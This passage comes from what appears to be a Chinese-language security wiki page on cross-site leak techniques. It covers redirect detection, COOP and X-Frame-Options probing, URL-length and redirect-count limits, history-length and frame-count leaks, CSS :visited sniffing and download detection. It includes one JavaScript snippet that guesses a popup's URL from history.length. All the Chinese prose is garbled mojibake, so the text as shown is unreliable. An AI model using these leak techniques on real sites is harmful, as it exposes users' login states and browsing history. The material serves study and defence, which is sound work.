å¦‚æœOriginå¤´éƒ¨åœ¨`Access-Control-Allow-Origin`å¤´éƒ¨ä¸­åå°„ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºå°è¯•ä»¥CORSæ¨¡å¼**è·å–**èµ„æºã€‚å¦‚æœ**æ²¡æœ‰è§¦å‘é”™è¯¯**ï¼Œåˆ™è¡¨ç¤ºå®ƒæ˜¯ä»Webä¸­**æ­£ç¡®è·å–çš„**ï¼Œå¦‚æœè§¦å‘äº†é”™è¯¯ï¼Œåˆ™è¡¨ç¤ºå®ƒæ˜¯ä»ç¼“å­˜ä¸­è®¿é—®çš„ï¼ˆé”™è¯¯å‡ºç°æ˜¯å› ä¸ºç¼“å­˜ä¿å­˜äº†ä¸€ä¸ªå¸¦æœ‰å…è®¸åŸå§‹åŸŸè€Œä¸æ˜¯æ”»å‡»è€…åŸŸçš„CORSå¤´éƒ¨çš„å“åº”ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œå¦‚æœæ²¡æœ‰åå°„Originï¼Œè€Œæ˜¯ä½¿ç”¨é€šé…ç¬¦ï¼ˆ`Access-Control-Allow-Origin: *`ï¼‰ï¼Œè¿™å°†ä¸èµ·ä½œç”¨ã€‚

## å¯è¯»å±æ€§æŠ€æœ¯

### Fetché‡å®šå‘

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **æ‘˜è¦**: GCå’ŒSAå…è®¸åœ¨é‡å®šå‘å®Œæˆåæ£€æŸ¥å“åº”çš„ç±»å‹ï¼ˆopaque-redirectï¼‰ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

ä½¿ç”¨Fetch APIæäº¤è¯·æ±‚æ—¶ï¼Œä½¿ç”¨`redirect: "manual"`å’Œå…¶ä»–å‚æ•°ï¼Œå¯ä»¥è¯»å–`response.type`å±æ€§ï¼Œå¦‚æœå®ƒç­‰äº`opaqueredirect`ï¼Œåˆ™å“åº”æ˜¯ä¸€ä¸ªé‡å®šå‘ã€‚

### COOP

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**: Header
* **æ›´å¤šä¿¡æ¯**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **æ‘˜è¦**: å—COOPä¿æŠ¤çš„é¡µé¢æ— æ³•è®¿é—®ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

æ”»å‡»è€…å¯ä»¥é€šè¿‡æ£€æŸ¥è·¨æºHTTPå“åº”ä¸­æ˜¯å¦å­˜åœ¨è·¨æºæ‰“å¼€ç­–ç•¥ï¼ˆCOOPï¼‰å¤´éƒ¨æ¥æ³„æ¼ä¿¡æ¯ã€‚

Webåº”ç”¨ç¨‹åºå¯ä»¥éƒ¨ç½²COOPå“åº”å¤´éƒ¨ï¼Œä»¥é˜²æ­¢å…¶ä»–ç½‘ç«™è·å¾—å¯¹åº”ç”¨ç¨‹åºçš„ä»»æ„çª—å£å¼•ç”¨ã€‚ç„¶è€Œï¼Œé€šè¿‡å°è¯•è¯»å–**`contentWindow`å¼•ç”¨**ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°æ£€æµ‹åˆ°è¿™ä¸ª**å¤´éƒ¨æ˜¯å¦å¯ç”¨**ã€‚å¦‚æœä¸€ä¸ªç«™ç‚¹åªåœ¨ä¸€ä¸ªçŠ¶æ€ä¸‹éƒ¨ç½²**COOP**ï¼Œåˆ™æ­¤å±æ€§ï¼ˆ`opener`ï¼‰ä¸º**æœªå®šä¹‰**ï¼Œå¦åˆ™ä¸º**å·²å®šä¹‰**ã€‚

### URLæœ€å¤§é•¿åº¦ - æœåŠ¡å™¨ç«¯

* **åŒ…å«æ–¹æ³•**: Fetch API, HTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç  / å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **æ‘˜è¦**: ç”±äºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½è¿‡é•¿ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›é”™è¯¯å¹¶ç”Ÿæˆè­¦æŠ¥ï¼Œå› æ­¤å¯ä»¥æ£€æµ‹åˆ°å“åº”å·®å¼‚ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

å¦‚æœæœåŠ¡å™¨ç«¯é‡å®šå‘ä½¿ç”¨äº†**é‡å®šå‘ä¸­çš„ç”¨æˆ·è¾“å…¥**å’Œ**é¢å¤–æ•°æ®**ã€‚å¯ä»¥é€šè¿‡æ£€æµ‹è¿™ç§è¡Œä¸ºæ¥åˆ¤æ–­ï¼Œå› ä¸ºé€šå¸¸**æœåŠ¡å™¨**æœ‰ä¸€ä¸ª**é™åˆ¶è¯·æ±‚é•¿åº¦**ã€‚å¦‚æœ**ç”¨æˆ·æ•°æ®**æ­£å¥½æ˜¯**é•¿åº¦-1**ï¼Œå› ä¸º**é‡å®šå‘**ä½¿ç”¨äº†**è¯¥æ•°æ®**å¹¶**æ·»åŠ äº†**ä¸€äº›**é¢å¤–å†…å®¹**ï¼Œå°†ä¼šè§¦å‘ä¸€ä¸ª**é€šè¿‡é”™è¯¯äº‹ä»¶å¯æ£€æµ‹åˆ°çš„é”™è¯¯**ã€‚

å¦‚æœæ‚¨å¯ä»¥å‘ç”¨æˆ·è®¾ç½®cookieï¼Œä¹Ÿå¯ä»¥é€šè¿‡**è®¾ç½®è¶³å¤Ÿå¤šçš„cookie**ï¼ˆ[**cookieç‚¸å¼¹**](hacking-with-cookies/cookie-bomb.md)ï¼‰æ¥æ‰§è¡Œæ­¤æ”»å‡»ï¼Œä»¥ä¾¿é€šè¿‡**æ­£ç¡®å“åº”çš„å¢åŠ å¤§å°**è§¦å‘é”™è¯¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä»åŒä¸€ç«™ç‚¹è§¦å‘æ­¤è¯·æ±‚ï¼Œ`<script>`å°†è‡ªåŠ¨å‘é€cookieï¼ˆå› æ­¤æ‚¨å¯ä»¥æ£€æŸ¥é”™è¯¯ï¼‰ã€‚\
å…³äº**cookieç‚¸å¼¹ + XS-Search**çš„ç¤ºä¾‹å¯ä»¥åœ¨æ­¤è§£å†³æ–¹æ¡ˆä¸­æ‰¾åˆ°ï¼š[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

é€šå¸¸ï¼Œå¯¹äºæ­¤ç±»æ”»å‡»ï¼Œéœ€è¦`SameSite=None`æˆ–å¤„äºç›¸åŒä¸Šä¸‹æ–‡ä¸­ã€‚
### URLæœ€å¤§é•¿åº¦-å®¢æˆ·ç«¯

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç /å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **æ‘˜è¦**ï¼šæ£€æµ‹å“åº”ä¸­çš„å·®å¼‚ï¼Œå› ä¸ºé‡å®šå‘å“åº”çš„é•¿åº¦å¯èƒ½å¤ªå¤§ï¼Œä»¥è‡³äºå¯ä»¥æ³¨æ„åˆ°å·®å¼‚ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

æ ¹æ®[Chromiumæ–‡æ¡£](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length)ï¼ŒChromeçš„æœ€å¤§URLé•¿åº¦ä¸º2MBã€‚

> ä¸€èˆ¬æ¥è¯´ï¼Œ_webå¹³å°_å¯¹URLçš„é•¿åº¦æ²¡æœ‰é™åˆ¶ï¼ˆå°½ç®¡2^31æ˜¯ä¸€ä¸ªå¸¸è§çš„é™åˆ¶ï¼‰ã€‚_Chrome_é™åˆ¶URLçš„æœ€å¤§é•¿åº¦ä¸º**2MB**ï¼Œå‡ºäºå®é™…åŸå› å’Œé¿å…åœ¨è¿›ç¨‹é—´é€šä¿¡ä¸­å¼•èµ·æ‹’ç»æœåŠ¡é—®é¢˜çš„è€ƒè™‘ã€‚

å› æ­¤ï¼Œå¦‚æœ**é‡å®šå‘URLåœ¨æŸäº›æƒ…å†µä¸‹å“åº”æ›´å¤§**ï¼Œåˆ™æœ‰å¯èƒ½ä½¿å…¶é‡å®šå‘åˆ°**å¤§äº2MBçš„URL**ä»¥è¾¾åˆ°**é•¿åº¦é™åˆ¶**ã€‚å½“å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼ŒChromeä¼šæ˜¾ç¤ºä¸€ä¸ª**`about:blank#blocked`**é¡µé¢ã€‚

**æ˜¾è‘—çš„å·®å¼‚**æ˜¯ï¼Œå¦‚æœ**é‡å®šå‘**å·²**å®Œæˆ**ï¼Œ`window.origin`ä¼šæŠ›å‡ºä¸€ä¸ª**é”™è¯¯**ï¼Œå› ä¸ºè·¨æºæ— æ³•è®¿é—®è¯¥ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœ**è¾¾åˆ°äº†é™åˆ¶**å¹¶ä¸”åŠ è½½çš„é¡µé¢æ˜¯**`about:blank#blocked`**ï¼Œçª—å£çš„**`origin`**ä»ç„¶æ˜¯**çˆ¶çº§**çš„ï¼Œè¿™æ˜¯ä¸€ä¸ª**å¯è®¿é—®çš„ä¿¡æ¯**ã€‚

å¯ä»¥é€šè¿‡åˆå§‹URLä¸­çš„**å“ˆå¸Œ**æ·»åŠ æ‰€æœ‰é¢å¤–çš„ä¿¡æ¯ï¼Œä»¥ä¾¿åœ¨é‡å®šå‘ä¸­**ä½¿ç”¨**å®ƒã€‚

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### æœ€å¤§é‡å®šå‘æ¬¡æ•°

* **åŒ…å«æ–¹æ³•**ï¼šFetch APIï¼Œæ¡†æ¶
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **æ‘˜è¦**ï¼šæ»¥ç”¨é‡å®šå‘é™åˆ¶ä»¥æ£€æµ‹é‡å®šå‘ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

å¦‚æœæµè§ˆå™¨è¦è·Ÿéšçš„**é‡å®šå‘**æ¬¡æ•°çš„**æœ€å¤§å€¼**ä¸º**20**ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•ä½¿ç”¨**19ä¸ªé‡å®šå‘**åŠ è½½è‡ªå·±çš„é¡µé¢ï¼Œæœ€åå°†å—å®³è€…**å‘é€åˆ°è¢«æµ‹è¯•çš„é¡µé¢**ã€‚å¦‚æœè§¦å‘äº†ä¸€ä¸ª**é”™è¯¯**ï¼Œé‚£ä¹ˆé¡µé¢è¯•å›¾**é‡å®šå‘å—å®³è€…**ã€‚

### å†å²é•¿åº¦

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **æ‘˜è¦**ï¼šJavaScriptä»£ç æ“çºµæµè§ˆå™¨å†å²è®°å½•ï¼Œå¹¶å¯ä»¥é€šè¿‡é•¿åº¦å±æ€§è®¿é—®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**å†å²API**å…è®¸JavaScriptä»£ç æ“çºµæµè§ˆå™¨å†å²è®°å½•ï¼Œè¯¥è®°å½•**ä¿å­˜ç”¨æˆ·è®¿é—®çš„é¡µé¢**ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨é•¿åº¦å±æ€§ä½œä¸ºåŒ…å«æ–¹æ³•ï¼šæ£€æµ‹JavaScriptå’ŒHTMLå¯¼èˆªã€‚\
**æ£€æŸ¥`history.length`**ï¼Œè®©ç”¨æˆ·**å¯¼èˆª**åˆ°ä¸€ä¸ªé¡µé¢ï¼Œ**å°†å…¶**æ”¹å›**åŒæº**ï¼Œå¹¶**æ£€æŸ¥**`history.length`**çš„æ–°å€¼ã€‚

### å¸¦æœ‰ç›¸åŒURLçš„å†å²é•¿åº¦

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šURLæ˜¯å¦ä¸çŒœæµ‹çš„URLç›¸åŒ
* **æ‘˜è¦**ï¼šå¯ä»¥é€šè¿‡æ»¥ç”¨å†å²é•¿åº¦æ¥çŒœæµ‹æ¡†æ¶/å¼¹å‡ºçª—å£çš„ä½ç½®æ˜¯å¦åœ¨ç‰¹å®šURLä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼šå¦‚ä¸‹

æ”»å‡»è€…å¯ä»¥ä½¿ç”¨JavaScriptä»£ç å°†**æ¡†æ¶/å¼¹å‡ºçª—å£ä½ç½®æ“çºµåˆ°çŒœæµ‹çš„ä½ç½®**ï¼Œå¹¶**ç«‹å³å°†å…¶æ›´æ”¹ä¸º`about:blank`**ã€‚å¦‚æœå†å²é•¿åº¦å¢åŠ ï¼Œè¿™æ„å‘³ç€URLæ˜¯æ­£ç¡®çš„ï¼Œå¹¶ä¸”æœ‰æ—¶é—´**å¢åŠ ï¼Œå› ä¸ºå¦‚æœURLç›¸åŒï¼Œåˆ™ä¸ä¼šé‡æ–°åŠ è½½**ã€‚å¦‚æœå†å²é•¿åº¦æ²¡æœ‰å¢åŠ ï¼Œè¿™æ„å‘³ç€å®ƒ**å°è¯•åŠ è½½çŒœæµ‹çš„URL**ï¼Œä½†å› ä¸ºæˆ‘ä»¬**ç«‹å³**åŠ è½½äº†**`about:blank`**ï¼Œæ‰€ä»¥**å†å²é•¿åº¦ä»æœªå¢åŠ **å½“åŠ è½½çŒœæµ‹çš„URLæ—¶ã€‚
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### å¸§è®¡æ•°

* **åŒ…å«æ–¹æ³•**ï¼šå¸§ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **æ‘˜è¦**ï¼šè¯»å–å¸§æ•°ï¼ˆwindow.lengthï¼‰ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

é€šè¿‡ä½¿ç”¨`iframe`æˆ–`window.open`æ‰“å¼€çš„**ç½‘é¡µä¸­çš„å¸§æ•°**è®¡æ•°å¯èƒ½æœ‰åŠ©äºç¡®å®šç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šçš„**çŠ¶æ€**ã€‚æ­¤å¤–ï¼Œå¦‚æœé¡µé¢å§‹ç»ˆå…·æœ‰ç›¸åŒæ•°é‡çš„å¸§æ•°ï¼ŒæŒç»­æ£€æŸ¥å¸§æ•°å¯èƒ½æœ‰åŠ©äºè¯†åˆ«å¯èƒ½æ³„æ¼ä¿¡æ¯çš„**æ¨¡å¼**ã€‚

ä¾‹å¦‚ï¼Œåœ¨Chromeä¸­ï¼Œå¯ä»¥é€šè¿‡**å¸§è®¡æ•°**æ£€æµ‹åˆ°**PDF**ï¼Œå› ä¸ºå†…éƒ¨ä½¿ç”¨äº†`embed`ã€‚æœ‰ä¸€äº›[æ‰“å¼€URLå‚æ•°](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)å¯ä»¥å¯¹å†…å®¹è¿›è¡Œä¸€äº›æ§åˆ¶ï¼Œä¾‹å¦‚`zoom`ï¼Œ`view`ï¼Œ`page`ï¼Œ`toolbar`ï¼Œè¿™ç§æŠ€æœ¯å¯èƒ½å¾ˆæœ‰è¶£ã€‚

### HTMLElements

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **æ‘˜è¦**ï¼šè¯»å–æ³„æ¼çš„å€¼ä»¥åŒºåˆ†ä¸¤ç§å¯èƒ½çš„çŠ¶æ€
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

æŸäº›ç½‘é¡µå¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·ä¿¡æ¯åŠ¨æ€ç”Ÿæˆåª’ä½“æ–‡ä»¶æˆ–æ·»åŠ æ›´æ”¹åª’ä½“å¤§å°çš„æ°´å°ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™äº›HTMLå…ƒç´ æ³„æ¼çš„ä¿¡æ¯æ¥åŒºåˆ†å¯èƒ½çš„çŠ¶æ€ã€‚

æŸäº›HTMLElementsä¼šå‘è·¨æºæ³„æ¼ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚å®ƒä»¬çš„åª’ä½“ç±»å‹ï¼š

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)æ³„æ¼åª’ä½“çš„`duration`å’Œ`buffered`æ—¶é—´ã€‚
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)æ³„æ¼`videoHeight`å’Œ`videoWidth`ï¼ŒæŸäº›æµè§ˆå™¨è¿˜å¯èƒ½å…·æœ‰`webkitVideoDecodedByteCount`ï¼Œ`webkitAudioDecodedByteCount`å’Œ`webkitDecodedFrameCount`ã€‚
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)æ³„æ¼`totalVideoFrames`ã€‚
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)æ³„æ¼`height`å’Œ`width`ï¼Œä½†å¦‚æœå›¾åƒæ— æ•ˆï¼Œå®ƒä»¬å°†ä¸º0ï¼Œ[`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode)å°†è¢«æ‹’ç»ã€‚

### CSSå±æ€§

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **æ‘˜è¦**ï¼šæ ¹æ®ç”¨æˆ·çŠ¶æ€æ£€æµ‹ç½‘ç«™æ ·å¼ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webåº”ç”¨ç¨‹åºå¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·çš„çŠ¶æ€æ›´æ”¹**ç½‘ç«™æ ·å¼**ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨**HTMLé“¾æ¥å…ƒç´ **å°†è·¨æºCSSæ–‡ä»¶åµŒå…¥åˆ°æ”»å‡»è€…é¡µé¢ä¸­ï¼Œå¹¶å°†è§„åˆ™åº”ç”¨äºæ”»å‡»è€…é¡µé¢ã€‚å¦‚æœé¡µé¢åŠ¨æ€æ›´æ”¹è¿™äº›è§„åˆ™ï¼Œæ”»å‡»è€…å¯ä»¥æ ¹æ®ç”¨æˆ·çŠ¶æ€**æ£€æµ‹**è¿™äº›**å·®å¼‚**ã€‚\
ä½œä¸ºä¸€ç§æ³„æ¼æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨`window.getComputedStyle`æ–¹æ³•æ¥**è¯»å–**ç‰¹å®šHTMLå…ƒç´ çš„CSSå±æ€§ã€‚å› æ­¤ï¼Œå¦‚æœå·²çŸ¥å—å½±å“çš„å…ƒç´ å’Œå±æ€§åç§°ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„CSSå±æ€§ã€‚

### CSSå†å²

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **æ‘˜è¦**ï¼šæ£€æµ‹æ˜¯å¦å°†`:visited`æ ·å¼åº”ç”¨äºURLï¼ŒæŒ‡ç¤ºå…¶å·²è¢«è®¿é—®è¿‡
* **ä»£ç ç¤ºä¾‹**ï¼š[http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
æ ¹æ®[**æ­¤å¤„**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)çš„è¯´æ³•ï¼Œåœ¨æ— å¤´Chromeä¸­æ— æ³•æ­£å¸¸å·¥ä½œã€‚
{% endhint %}

ä½¿ç”¨CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)é€‰æ‹©å™¨ï¼Œå¯ä»¥ä¸ºå·²è®¿é—®çš„URLåº”ç”¨ä¸åŒçš„æ ·å¼ã€‚\
ä»¥å‰å¯ä»¥ä½¿ç”¨[`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)æ¥æ£€æµ‹æ­¤å·®å¼‚ï¼Œä½†ç°åœ¨æµè§ˆå™¨é€šè¿‡å§‹ç»ˆè¿”å›å€¼ï¼Œå°±å¥½åƒé“¾æ¥å·²è®¿é—®è¿‡ï¼Œå¹¶é™åˆ¶å¯ä»¥ä½¿ç”¨é€‰æ‹©å™¨åº”ç”¨çš„æ ·å¼æ¥é˜»æ­¢è¿™ç§æ“ä½œã€‚\
å› æ­¤ï¼Œå¯èƒ½éœ€è¦è¯±ä½¿ç”¨æˆ·ç‚¹å‡»å—CSSå½±å“çš„åŒºåŸŸï¼Œå¯ä»¥ä½¿ç”¨[`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)æ¥å®ç°ã€‚\
è¿˜æœ‰ä¸€äº›æ— éœ€ç”¨æˆ·äº¤äº’çš„æ–¹æ³•ï¼Œä¾‹å¦‚æ»¥ç”¨æ¸²æŸ“æ—¶é—´ï¼Œè¿™æ˜¯å› ä¸ºå°†é“¾æ¥ç»˜åˆ¶ä¸ºä¸åŒé¢œè‰²éœ€è¦æ—¶é—´ã€‚\
åœ¨ä¸€ä¸ªChromiumæŠ¥å‘Šä¸­æä¾›äº†ä¸€ä¸ªPoCï¼Œå®ƒé€šè¿‡ä½¿ç”¨å¤šä¸ªé“¾æ¥æ¥å¢åŠ æ—¶é—´å·®å¼‚æ¥å®ç°ã€‚
### ContentDocument X-Frameæ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šFrames
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šHeaders
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **æ‘˜è¦**ï¼šåœ¨GCä¸­ï¼Œå½“ä¸€ä¸ªé¡µé¢ç”±äº**X-Frame-Optionsä¸å…è®¸åµŒå…¥åˆ°è·¨æºé¡µé¢æ—¶ï¼Œä¼šæ˜¾ç¤ºé”™è¯¯é¡µé¢**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

åœ¨Chromeä¸­ï¼Œå½“ä¸€ä¸ªé¡µé¢ç”±äº**X-FrameOptions**ï¼ˆXFOï¼‰å¤´è®¾ç½®ä¸ºdenyæˆ–same-originè€Œä¸å…è®¸åµŒå…¥åˆ°è·¨æºé¡µé¢æ—¶ï¼Œä¼š**æ˜¾ç¤ºé”™è¯¯é¡µé¢**ã€‚å¯¹äºå¯¹è±¡æ¥è¯´ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥`contentDocument`å±æ€§æ¥**æ£€æµ‹åˆ°è¿™ä¸ªé”™è¯¯é¡µé¢**ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå±æ€§è¿”å›nullï¼Œå› ä¸ºä¸å…è®¸è®¿é—®è·¨æºåµŒå…¥çš„æ–‡æ¡£ã€‚ç„¶è€Œï¼Œç”±äºChromeå¯¹é”™è¯¯é¡µé¢çš„æ¸²æŸ“ï¼Œä¼šè¿”å›ä¸€ä¸ª**ç©ºçš„æ–‡æ¡£å¯¹è±¡**ã€‚è¿™å¯¹äºiframesæˆ–å…¶ä»–æµè§ˆå™¨ä¸èµ·ä½œç”¨ã€‚å¼€å‘äººå‘˜å¯èƒ½ä¼šå¿˜è®°ä¸ºæ‰€æœ‰é¡µé¢è®¾ç½®X-Frame-Optionsï¼Œå°¤å…¶æ˜¯é”™è¯¯é¡µé¢ç»å¸¸ä¼šç¼ºå°‘è¿™ä¸ªå¤´ã€‚ä½œä¸ºä¸€ç§æ³„æ¼æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ£€æŸ¥å®ƒæ¥åŒºåˆ†ä¸åŒçš„ç”¨æˆ·çŠ¶æ€ã€‚

### ä¸‹è½½æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šFramesï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šHeaders
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **æ‘˜è¦**ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨iframesæ¥æ£€æµ‹ä¸‹è½½ã€‚å¦‚æœiframeä»ç„¶å¯è®¿é—®ï¼Œåˆ™æ–‡ä»¶å·²ä¸‹è½½ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

